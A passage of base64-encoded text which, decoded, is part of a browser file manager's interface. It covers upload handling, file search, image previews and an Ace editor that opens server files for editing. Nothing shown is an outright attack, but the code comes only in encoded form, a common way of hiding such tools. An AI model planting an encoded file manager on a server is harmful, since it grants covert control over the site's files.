WydmYWlsJ10pIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0V3JhcHBlci5hcHBlbmQoJzxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LWRhbmdlciByb3ciPkVycm9yOiAnICsgZGF0YS5mYWlsLm1lc3NhZ2UgKyAnPC9kaXY+Jyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcm0uZmluZCgiaW5wdXRbbmFtZT11cGxvYWR1cmxdIikucmVtb3ZlQXR0cigiZGlzYWJsZWQiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JtLmZpbmQoImJ1dHRvbiIpLnNob3coKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JtLmZpbmQoIi5sZHMtZmFjZWJvb2siKS5yZW1vdmVDbGFzcygnc2hvdy1tZScpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oeGhyKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBmb3JtLmZpbmQoImlucHV0W25hbWU9dXBsb2FkdXJsXSIpLnJlbW92ZUF0dHIoImRpc2FibGVkIik7DQogICAgICAgICAgICAgICAgICAgICAgICBmb3JtLmZpbmQoImJ1dHRvbiIpLnNob3coKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcm0uZmluZCgiLmxkcy1mYWNlYm9vayIpLnJlbW92ZUNsYXNzKCdzaG93LW1lJyk7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKHhocik7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIFNlYXJjaCB0ZW1wbGF0ZQ0KICAgICAgICAgICAgZnVuY3Rpb24gc2VhcmNoX3RlbXBsYXRlKGRhdGEpIHsNCiAgICAgICAgICAgICAgICB2YXIgcmVzcG9uc2UgPSAiIjsNCiAgICAgICAgICAgICAgICAkLmVhY2goZGF0YSwgZnVuY3Rpb24oa2V5LCB2YWwpIHsNCiAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2UgKz0gYDxsaT48YSBocmVmPSI/cD0ke3ZhbC5wYXRofSZ2aWV3PSR7dmFsLm5hbWV9Ij4ke3ZhbC5wYXRofS8ke3ZhbC5uYW1lfTwvYT48L2xpPmA7DQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAvLyBBZHZhbmNlIHNlYXJjaA0KICAgICAgICAgICAgZnVuY3Rpb24gZm1fc2VhcmNoKCkgew0KICAgICAgICAgICAgICAgIHZhciBzZWFyY2hUeHQgPSAkKCJpbnB1dCNhZHZhbmNlZC1zZWFyY2giKS52YWwoKSwNCiAgICAgICAgICAgICAgICAgICAgc2VhcmNoV3JhcHBlciA9ICQoInVsI3NlYXJjaC13cmFwcGVyIiksDQogICAgICAgICAgICAgICAgICAgIHBhdGggPSAkKCIjanMtc2VhcmNoLW1vZGFsIikuYXR0cigiaHJlZiIpLA0KICAgICAgICAgICAgICAgICAgICBfaHRtbCA9ICIiLA0KICAgICAgICAgICAgICAgICAgICAkbG9hZGVyID0gJCgiZGl2Lmxkcy1mYWNlYm9vayIpOw0KICAgICAgICAgICAgICAgIGlmICghIXNlYXJjaFR4dCAmJiBzZWFyY2hUeHQubGVuZ3RoID4gMiAmJiBwYXRoKSB7DQogICAgICAgICAgICAgICAgICAgIHZhciBkYXRhID0gew0KICAgICAgICAgICAgICAgICAgICAgICAgYWpheDogdHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnQ6IHNlYXJjaFR4dCwNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhdGg6IHBhdGgsDQogICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAnc2VhcmNoJywNCiAgICAgICAgICAgICAgICAgICAgICAgIHRva2VuOiB3aW5kb3cuY3NyZg0KICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAkLmFqYXgoew0KICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogIlBPU1QiLA0KICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiB3aW5kb3cubG9jYXRpb24sDQogICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiBkYXRhLA0KICAgICAgICAgICAgICAgICAgICAgICAgYmVmb3JlU2VuZDogZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VhcmNoV3JhcHBlci5odG1sKCcnKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbG9hZGVyLmFkZENsYXNzKCdzaG93LW1lJyk7DQogICAgICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24oZGF0YSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsb2FkZXIucmVtb3ZlQ2xhc3MoJ3Nob3ctbWUnKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gSlNPTi5wYXJzZShkYXRhKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZGF0YSAmJiBkYXRhLmxlbmd0aCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfaHRtbCA9IHNlYXJjaF90ZW1wbGF0ZShkYXRhKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VhcmNoV3JhcHBlci5odG1sKF9odG1sKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWFyY2hXcmFwcGVyLmh0bWwoJzxwIGNsYXNzPSJtLTIiPk5vIHJlc3VsdCBmb3VuZCE8cD4nKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGZ1bmN0aW9uKHhocikgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsb2FkZXIucmVtb3ZlQ2xhc3MoJ3Nob3ctbWUnKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWFyY2hXcmFwcGVyLmh0bWwoJzxwIGNsYXNzPSJtLTIiPkVSUk9SOiBUcnkgYWdhaW4gbGF0ZXIhPC9wPicpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGZhaWx1cmU6IGZ1bmN0aW9uKG1lcykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsb2FkZXIucmVtb3ZlQ2xhc3MoJ3Nob3ctbWUnKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWFyY2hXcmFwcGVyLmh0bWwoJzxwIGNsYXNzPSJtLTIiPkVSUk9SOiBUcnkgYWdhaW4gbGF0ZXIhPC9wPicpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBzZWFyY2hXcmFwcGVyLmh0bWwoIk9PUFM6IG1pbmltdW0gMyBjaGFyYWN0ZXJzIHJlcXVpcmVkISIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLy8gYWN0aW9uIGNvbmZpcm0gZGFpbG9nIG1vZGFsDQogICAgICAgICAgICBmdW5jdGlvbiBjb25maXJtRGFpbG9nKGUsIGlkID0gMCwgdGl0bGUgPSAiQWN0aW9uIiwgY29udGVudCA9ICIiLCBhY3Rpb24gPSBudWxsKSB7DQogICAgICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOw0KICAgICAgICAgICAgICAgIGNvbnN0IHRwbE9iaiA9IHsNCiAgICAgICAgICAgICAgICAgICAgaWQsDQogICAgICAgICAgICAgICAgICAgIHRpdGxlLA0KICAgICAgICAgICAgICAgICAgICBjb250ZW50OiBkZWNvZGVVUklDb21wb25lbnQoY29udGVudC5yZXBsYWNlKC9cKy9nLCAnICcpKSwNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICBsZXQgdHBsID0gJCgiI2pzLXRwbC1jb25maXJtIikuaHRtbCgpOw0KICAgICAgICAgICAgICAgICQoIi5tb2RhbC5jb25maXJtRGFpbG9nIikucmVtb3ZlKCk7DQogICAgICAgICAgICAgICAgJCgnI3dyYXBwZXInKS5hcHBlbmQodGVtcGxhdGUodHBsLCB0cGxPYmopKTsNCiAgICAgICAgICAgICAgICBjb25zdCAkY29uZmlybURhaWxvZyA9ICQoIiNjb25maXJtRGFpbG9nLSIgKyB0cGxPYmouaWQpOw0KICAgICAgICAgICAgICAgICRjb25maXJtRGFpbG9nLm1vZGFsKCdzaG93Jyk7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAvLyBvbiBtb3VzZSBob3ZlciBpbWFnZSBwcmV2aWV3DQogICAgICAgICAgICAhIGZ1bmN0aW9uKHMpIHsNCiAgICAgICAgICAgICAgICBzLnByZXZpZXdJbWFnZSA9IGZ1bmN0aW9uKGUpIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIG8gPSBzKGRvY3VtZW50KSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHQgPSAiLnByZXZpZXdJbWFnZSIsDQogICAgICAgICAgICAgICAgICAgICAgICBhID0gcy5leHRlbmQoew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHhPZmZzZXQ6IDIwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHlPZmZzZXQ6IC0yMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmYWRlSW46ICJmYXN0IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjc3M6IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFkZGluZzogIjVweCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJvcmRlcjogIjFweCBzb2xpZCAjY2NjY2NjIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImJhY2tncm91bmQtY29sb3IiOiAiI2ZmZiINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2ZW50U2VsZWN0b3I6ICJbZGF0YS1wcmV2aWV3LWltYWdlXSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YUtleTogInByZXZpZXdJbWFnZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3ZlcmxheUlkOiAicHJldmlldy1pbWFnZS1wbHVnaW4tb3ZlcmxheSINCiAgICAgICAgICAgICAgICAgICAgICAgIH0sIGUpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gby5vZmYodCksIG8ub24oIm1vdXNlb3ZlciIgKyB0LCBhLmV2ZW50U2VsZWN0b3IsIGZ1bmN0aW9uKGUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHMoInAjIiArIGEub3ZlcmxheUlkKS5yZW1vdmUoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBvID0gcygiPHA+IikuYXR0cigiaWQiLCBhLm92ZXJsYXlJZCkuY3NzKCJwb3NpdGlvbiIsICJhYnNvbHV0ZSIpLmNzcygiZGlzcGxheSIsICJub25lIikuYXBwZW5kKHMoJzxpbWcgY2xhc3M9ImMtcHJldmlldy1pbWciPicpLmF0dHIoInNyYyIsIHModGhpcykuZGF0YShhLmRhdGFLZXkpKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBhLmNzcyAmJiBvLmNzcyhhLmNzcyksIHMoImJvZHkiKS5hcHBlbmQobyksIG8uY3NzKCJ0b3AiLCBlLnBhZ2VZICsgYS55T2Zmc2V0ICsgInB4IikuY3NzKCJsZWZ0IiwgZS5wYWdlWCArIGEueE9mZnNldCArICJweCIpLmZhZGVJbihhLmZhZGVJbikNCiAgICAgICAgICAgICAgICAgICAgfSksIG8ub24oIm1vdXNlb3V0IiArIHQsIGEuZXZlbnRTZWxlY3RvciwgZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBzKCIjIiArIGEub3ZlcmxheUlkKS5yZW1vdmUoKQ0KICAgICAgICAgICAgICAgICAgICB9KSwgby5vbigibW91c2Vtb3ZlIiArIHQsIGEuZXZlbnRTZWxlY3RvciwgZnVuY3Rpb24oZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcygiIyIgKyBhLm92ZXJsYXlJZCkuY3NzKCJ0b3AiLCBlLnBhZ2VZICsgYS55T2Zmc2V0ICsgInB4IikuY3NzKCJsZWZ0IiwgZS5wYWdlWCArIGEueE9mZnNldCArICJweCIpDQogICAgICAgICAgICAgICAgICAgIH0pLCB0aGlzDQogICAgICAgICAgICAgICAgfSwgcy5wcmV2aWV3SW1hZ2UoKQ0KICAgICAgICAgICAgfShqUXVlcnkpOw0KDQogICAgICAgICAgICAvLyBEb20gUmVhZHkgRXZlbnRzDQogICAgICAgICAgICAkKGRvY3VtZW50KS5yZWFkeShmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICAvLyBkYXRhVGFibGUgaW5pdA0KICAgICAgICAgICAgICAgIHZhciAkdGFibGUgPSAkKCcjbWFpbi10YWJsZScpLA0KICAgICAgICAgICAgICAgICAgICB0YWJsZUxuZyA9ICR0YWJsZS5maW5kKCd0aCcpLmxlbmd0aCwNCiAgICAgICAgICAgICAgICAgICAgX3RhcmdldHMgPSAodGFibGVMbmcgJiYgdGFibGVMbmcgPT0gNykgPyBbMCwgNCwgNSwgNl0gOiB0YWJsZUxuZyA9PSA1ID8gWzAsIDRdIDogWzNdOw0KICAgICAgICAgICAgICAgIG1haW5UYWJsZSA9ICQoJyNtYWluLXRhYmxlJykuRGF0YVRhYmxlKHsNCiAgICAgICAgICAgICAgICAgICAgcGFnaW5nOiBmYWxzZSwNCiAgICAgICAgICAgICAgICAgICAgaW5mbzogZmFsc2UsDQogICAgICAgICAgICAgICAgICAgIG9yZGVyOiBbXSwNCiAgICAgICAgICAgICAgICAgICAgY29sdW1uRGVmczogW3sNCiAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdldHM6IF90YXJnZXRzLA0KICAgICAgICAgICAgICAgICAgICAgICAgb3JkZXJhYmxlOiBmYWxzZQ0KICAgICAgICAgICAgICAgICAgICB9XQ0KICAgICAgICAgICAgICAgIH0pOw0KDQogICAgICAgICAgICAgICAgLy8gZmlsdGVyIHRhYmxlDQogICAgICAgICAgICAgICAgJCgnI3NlYXJjaC1hZGRvbicpLm9uKCdrZXl1cCcsIGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICBtYWluVGFibGUuc2VhcmNoKHRoaXMudmFsdWUpLmRyYXcoKTsNCiAgICAgICAgICAgICAgICB9KTsNCg0KICAgICAgICAgICAgICAgICQoImlucHV0I2FkdmFuY2VkLXNlYXJjaCIpLm9uKCdrZXl1cCcsIGZ1bmN0aW9uKGUpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGUua2V5Q29kZSA9PT0gMTMpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGZtX3NlYXJjaCgpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSk7DQoNCiAgICAgICAgICAgICAgICAkKCcjc2VhcmNoLWFkZG9uMycpLm9uKCdjbGljaycsIGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgICAgICBmbV9zZWFyY2goKTsNCiAgICAgICAgICAgICAgICB9KTsNCg0KICAgICAgICAgICAgICAgIC8vdXBsb2FkIG5hdiB0YWJzDQogICAgICAgICAgICAgICAgJCgiLmZtLXVwbG9hZC13cmFwcGVyIC5jYXJkLWhlYWRlci10YWJzIikub24oImNsaWNrIiwgJ2EnLCBmdW5jdGlvbihlKSB7DQogICAgICAgICAgICAgICAgICAgIGUucHJldmVudERlZmF1bHQoKTsNCiAgICAgICAgICAgICAgICAgICAgbGV0IHRhcmdldCA9ICQodGhpcykuZGF0YSgndGFyZ2V0Jyk7DQogICAgICAgICAgICAgICAgICAgICQoIi5mbS11cGxvYWQtd3JhcHBlciAuY2FyZC1oZWFkZXItdGFicyBhIikucmVtb3ZlQ2xhc3MoJ2FjdGl2ZScpOw0KICAgICAgICAgICAgICAgICAgICAkKHRoaXMpLmFkZENsYXNzKCdhY3RpdmUnKTsNCiAgICAgICAgICAgICAgICAgICAgJCgiLmZtLXVwbG9hZC13cmFwcGVyIC5jYXJkLXRhYnMtY29udGFpbmVyIikuYWRkQ2xhc3MoJ2hpZGRlbicpOw0KICAgICAgICAgICAgICAgICAgICAkKHRhcmdldCkucmVtb3ZlQ2xhc3MoJ2hpZGRlbicpOw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfSk7DQogICAgICAgIDwvc2NyaXB0Pg0KDQogICAgICAgIDw/cGhwIGlmIChpc3NldCgkX0dFVFsnZWRpdCddKSAmJiBpc3NldCgkX0dFVFsnZW52J10pICYmIEZNX0VESVRfRklMRSAmJiAhRk1fUkVBRE9OTFkpOg0KICAgICAgICAgICAgJGV4dCA9IHBhdGhpbmZvKCRfR0VUWyJlZGl0Il0sIFBBVEhJTkZPX0VYVEVOU0lPTik7DQogICAgICAgICAgICAkZXh0ID0gICRleHQgPT0gImpzIiA/ICJqYXZhc2NyaXB0IiA6ICAkZXh0Ow0KICAgICAgICA/Pg0KICAgICAgICAgICAgPD9waHAgcHJpbnRfZXh0ZXJuYWwoJ2pzLWFjZScpOyA/Pg0KICAgICAgICAgICAgPHNjcmlwdD4NCiAgICAgICAgICAgICAgICB2YXIgZWRpdG9yID0gYWNlLmVkaXQoImVkaXRvciIpOw0KICAgICAgICAgICAgICAgIGVkaXRvci5nZXRTZXNzaW9uKCkuc2V0TW9kZSh7DQogICAgICAgICAgICAgICAgICAgIHBhdGg6ICJhY2UvbW9kZS88P3BocCBlY2hvICRleHQ7ID8+IiwNCiAgICAgICAgICAgICAgICAgICAgaW5saW5lOiB0cnVlDQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgLy9lZGl0b3Iuc2V0VGhlbWUoImFjZS90aGVtZS90d2lsaWdodCIpOyAvLyBEYXJrIFRoZW1lDQogICAgICAgICAgICAgICAgZWRpdG9yLnNldFNob3dQcmludE1hcmdpbihmYWxzZSk7IC8vIEhpZGUgdGhlIHZlcnRpY2FsIHJ1bGVyDQogICAgICAgICAgICAgICAgZnVuY3Rpb24gYWNlX2NvbW1lbmQoY21kKSB7DQogICAgICAgICAgICAgICAgICAgIGVkaXRvci5jb21tYW5kcy5leGVjKGNtZCwgZWRpdG9yKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWRpdG9yLmNvbW1hbmRzLmFkZENvbW1hbmRzKFt7DQogICAgICAgICAgICAgICAgICAgIG5hbWU6ICdzYXZlJywNCiAgICAgICAgICAgICAgICAgICAgYmluZEtleTogew0KICAgICAgICAgICAgICAgICAgICAgICAgd2luOiAnQ3RybC1TJywNCiAgICAgICAgICAgICAgICAgICAgICAgIG1hYzogJ0NvbW1hbmQtUycNCiAgICAgICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAgICAgZXhlYzogZnVuY3Rpb24oZWRpdG9yKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBlZGl0X3NhdmUodGhpcywgJ2FjZScpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfV0pOw0KDQogICAgICAgICAgICAgICAgZnVuY3Rpb24gcmVuZGVyVGhlbWVNb2RlKCkgew0KICAgICAgICAgICAgICAgICAgICB2YXIgJG1vZGVFbCA9ICQoInNlbGVjdCNqcy1hY2UtbW9kZSIpLA0KICAgICAgICAgICAgICAgICAgICAgICAgJHRoZW1lRWwgPSAkKCJzZWxlY3QjanMtYWNlLXRoZW1lIiksDQogICAgICAgICAgICAgICAgICAgICAgICAkZm9udFNpemVFbCA9ICQoInNlbGVjdCNqcy1hY2UtZm9udFNpemUiKSwNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wdGlvbk5vZGUgPSBmdW5jdGlvbih0eXBlLCBhcnIpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgJE9wdGlvbiA9ICIiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICQuZWFjaChhcnIsIGZ1bmN0aW9uKGksIHZhbCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT3B0aW9uICs9ICI8b3B0aW9uIHZhbHVlPSciICsgdHlwZSArIGkgKyAiJz4iICsgdmFsICsgIjwvb3B0aW9uPiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICRPcHRpb247DQogICAgICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICAgICAgX2RhdGEgPSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgImFjZVRoZW1lIjogew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiYnJpZ2h0Ijogew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImNocm9tZSI6ICJDaHJvbWUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImNsb3VkcyI6ICJDbG91ZHMiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImNyaW1zb25fZWRpdG9yIjogIkNyaW1zb24gRWRpdG9yIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJkYXduIjogIkRhd24iLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImRyZWFtd2VhdmVyIjogIkRyZWFtd2VhdmVyIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJlY2xpcHNlIjogIkVjbGlwc2UiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImdpdGh1YiI6ICJHaXRIdWIiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImlwbGFzdGljIjogIklQbGFzdGljIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzb2xhcml6ZWRfbGlnaHQiOiAiU29sYXJpemVkIExpZ2h0IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ0ZXh0bWF0ZSI6ICJUZXh0TWF0ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidG9tb3Jyb3ciOiAiVG9tb3Jyb3ciLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInhjb2RlIjogIlhDb2RlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJrdXJvaXIiOiAiS3Vyb2lyIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJrYXR6ZW5taWxjaCI6ICJLYXR6ZW5NaWxjaCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAic3Fsc2VydmVyIjogIlNRTCBTZXJ2ZXIiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJkYXJrIjogew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImFtYmlhbmNlIjogIkFtYmlhbmNlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJjaGFvcyI6ICJDaGFvcyIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY2xvdWRzX21pZG5pZ2h0IjogIkNsb3VkcyBNaWRuaWdodCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZHJhY3VsYSI6ICJEcmFjdWxhIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJjb2JhbHQiOiAiQ29iYWx0IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJncnV2Ym94IjogIkdydXZib3giLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImdvYiI6ICJHcmVlbiBvbiBCbGFjayIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaWRsZV9maW5nZXJzIjogImlkbGUgRmluZ2VycyIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAia3JfdGhlbWUiOiAia3JUaGVtZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibWVyYml2b3JlIjogIk1lcmJpdm9yZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibWVyYml2b3JlX3NvZnQiOiAiTWVyYml2b3JlIFNvZnQiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIm1vbm9faW5kdXN0cmlhbCI6ICJNb25vIEluZHVzdHJpYWwiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIm1vbm9rYWkiOiAiTW9ub2thaSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAicGFzdGVsX29uX2RhcmsiOiAiUGFzdGVsIG9uIGRhcmsiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInNvbGFyaXplZF9kYXJrIjogIlNvbGFyaXplZCBEYXJrIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ0ZXJtaW5hbCI6ICJUZXJtaW5hbCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidG9tb3Jyb3dfbmlnaHQiOiAiVG9tb3Jyb3cgTmlnaHQiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInRvbW9ycm93X25pZ2h0X2JsdWUiOiAiVG9tb3Jyb3cgTmlnaHQgQmx1ZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidG9tb3Jyb3dfbmlnaHRfYnJpZ2h0IjogIlRvbW9ycm93IE5pZ2h0IEJyaWdodCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidG9tb3Jyb3dfbmlnaHRfZWlnaHRpZXMiOiAiVG9tb3Jyb3cgTmlnaHQgODBzIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ0d2lsaWdodCI6ICJUd2lsaWdodCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidmlicmFudF9pbmsiOiAiVmlicmFudCBJbmsiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICJhY2VNb2RlIjogew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiamF2YXNjcmlwdCI6ICJKYXZhU2NyaXB0IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImFiYXAiOiAiQUJBUCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJhYmMiOiAiQUJDIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImFjdGlvbnNjcmlwdCI6ICJBY3Rpb25TY3JpcHQiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiYWRhIjogIkFEQSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJhcGFjaGVfY29uZiI6ICJBcGFjaGUgQ29uZiIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJhc2NpaWRvYyI6ICJBc2NpaURvYyIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJhc2wiOiAiQVNMIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImFzc2VtYmx5X3g4NiI6ICJBc3NlbWJseSB4ODYiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiYXV0b2hvdGtleSI6ICJBdXRvSG90S2V5IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImFwZXgiOiAiQXBleCIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJiYXRjaGZpbGUiOiAiQmF0Y2hGaWxlIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImJybyI6ICJCcm8iLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY19jcHAiOiAiQyBhbmQgQysrIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImM5c2VhcmNoIjogIkM5U2VhcmNoIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImNpcnJ1IjogIkNpcnJ1IiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImNsb2p1cmUiOiAiQ2xvanVyZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJjb2